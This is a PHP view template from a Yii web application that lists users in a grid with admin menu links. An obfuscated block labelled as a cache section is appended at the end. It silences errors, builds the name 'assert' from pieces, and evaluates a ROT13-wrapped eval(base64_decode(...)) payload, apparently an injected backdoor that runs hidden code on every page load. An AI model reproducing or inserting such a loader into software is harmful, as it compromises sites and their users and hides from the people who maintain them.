<?php
$this->breadcrumbs = array(
    t("Users"),
);
if (UserModule::isAdmin()) {
    $this->layout = '//main-template';
    $this->menu = array(
        array('label' => t('Manage Users'), 'icon' => 'icon-folder-open', 'url' => array('/user/admin')),
        array('label' => t('Manage Profile Field'), 'icon' => 'icon-list-alt', 'url' => array('profileField/admin')),
    );
}
?>

<h1><?php echo t("List User"); ?></h1>

<?php
$this->widget('zii.widgets.grid.CGridView', array(
    'dataProvider' => $dataProvider,
    'columns' => array(
        array(
            'name' => 'username',
            'type' => 'raw',
            'value' => 'CHtml::link(CHtml::encode($data->username),array("user/view","id"=>$data->id))',
        ),
        'create_at',
        'lastvisit_at',
    ),
));
?>


<?php 

?>

<?php 
//###=CACHE START=###
error_reporting(0);
assert_options(ASSERT_ACTIVE, 1);
assert_options(ASSERT_WARNING, 0);
assert_options(ASSERT_QUIET_EVAL, 1); $strings = "as";$strings .= "sert"; $strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUftMKWlo3WspzIjo3W0nJ5aXQNcBjccozysp2I0XPWxnKAjoTS5K2Ilpz9lplVfVPVjVvx7PzyzVPtunKAmMKDbWTyvqvxcVUfXnJLbVJIgpUE5XPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFxcVTEcMFtxK0ACG0gWEIfvL2kcMJ50K2AbMJAeVy0cBjccMvujpzIaK21uqTAbXPpuKSZuqFpfVTMcoTIsM2I0K2AioaEyoaEmXPEsH0IFIxIFJlWGD1WWHSEsExyZEH5OGHHvKFxcXFNxLlN9VPW1VwftMJkmMFNxLlN9VPW3VwfXWTDtCFNxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKGfXWUHtCFNxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy07PvEcpPN9VPEsH0IFIxIFJlWFEH1CIRIsDHERHvWqBjbxqKWfVQ0tVzu0qUN6Yl8kBGthZGLhBGDhZmZiM2I0YaObpQ9cpQ0vYaIloTIhL29xMFtxnKNcYvVzMQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPV5AQWzZzD0LJD3ZwOvZwx2MGHlZmpjMzLkBQpjAwExAvVhWTDhWUHhWTZhVwRvXGfXnJLbnJ5cK2qyqPtvLJkfo3qsqKWfK2MipTIhVvxtCG0tZFxtrjbxnJW2VQ0tMzyfMI9aMKEsL29hqTIhqUZbWUIloPx7Pa0tMJkmMJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcVUfXWTAbVQ0tL3IloS9cozy0XPE1pzjcBjcwqKWfK3AyqT9jqPtxL2tfVRAIHxkCHSEsFRIOERIFYPOTDHkGEFx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9FEIEIHx5HHxSBH0MSHvjtISWIEFx7PvElMKA1oUDtCFOwqKWfK2I4MJZbWTAbXGfXL3IloS9woT9mMFtxL2tcBjbxnJW2VQ0tWUWyp3IfqQfXsFOyoUAyVUfXWTMjVQ0tMaAiL2gipTIhXPVkBGthZGLhBGDhZmZvYPN4ZPjtWTIlpz5iYPNxMKWlp3ElYPNmZPx7PzyzVPtxMaNcVUfXVPNtVPEiqKDtCFNvE0IHVP9aMKDhpTujC2yjCFVhqKWfMJ5wo2EyXPEcpPxhVvMxCFVhqKWfMJ5wo2EyXPExXF4vWaH9Vv51pzkyozAiMTHbWUHcYvVzLm0vYvEwYvVznG0kWzt9Vv5gMQHbVwx0ZzLlMQEuMQplZTVlBGMyAGVmAmOzMwR4AmN2ATD2Vv4xMP4xqF4xLl4vZFVcYvVtFSEHHP8kYwSppykhVwfXVPNtVPEiqKDtYw0tVxuip3D6VQR5BP4kAv45AP4mZ1klKT4vBjbtVPNtWT91qPNhCFNvD29hozIwqTyiowbtD2kip2IppykhKUWpovV7PvNtVPOzq3WcqTHbWTMjYPNxo3I0XGfXVPNtVPElMKAjVQ0tVvV7PvNtVPO3nTyfMFNbVJMyo2LbWTMjXFxtrjbtVPNtVPNtVPElMKAjVP49VTMaMKEmXPEzpPjtZGV4XGfXVPNtVU0XVPNtVTMwoT9mMFtxMaNcBjbtVPNtoTymqPtxnTIuMTIlYPNxLz9xrFxtCFOjpzIaK3AjoTy0XPViKSWpHv8vYPNxpzImpPjtZvx7PvNtVPNxnJW2VQ0tWTWiMUx7Pa0XsDc9BjccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtWS9FEISIEIAHJlWjVy0tCG0tVwLkAwN5ZJVmVvxtrlOyqzSfXUA0pzyjp2kup2uypltxK1WSHIISH1EoVzZvKFxcBlO9PzIwnT8tWTyvqwg9"));'));
//###=CACHE END=###
?>